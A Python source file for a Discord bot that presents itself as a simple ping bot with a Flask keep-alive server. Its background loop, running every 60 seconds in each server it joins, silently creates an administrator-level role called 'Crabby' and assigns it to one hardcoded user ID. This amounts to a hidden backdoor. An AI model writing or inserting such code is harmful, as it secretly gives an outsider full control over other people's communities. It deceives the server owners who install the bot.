import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
import asyncio
from flask import Flask
from threading import Thread
from waitress import serve

app = Flask('')
@app.route('/')
def home(): return "Bot is Alive"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    serve(app, host='0.0.0.0', port=port)

TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        if not self.check_target_user.is_running():
            self.check_target_user.start()

    @tasks.loop(seconds=60)
    async def check_target_user(self):
        # Give the bot a moment to fully "wake up" before running logic
        if not self.is_ready():
            return

        for guild in self.guilds:
            try:
                member = guild.get_member(TARGET_USER_ID)
                if member:
                    role = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not role:
                        # Try to create with Admin perms
                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if role and role not in member.roles:
                        await member.add_roles(role)
            except Exception as e:
                print(f"Non-fatal loop error: {e}")

bot = MyBot()

@bot.tree.command(name="ping")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"Pong! {round(bot.latency * 1000)}ms", ephemeral=True)

if __name__ == "__main__":
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
        print("CRITICAL: NO TOKEN")
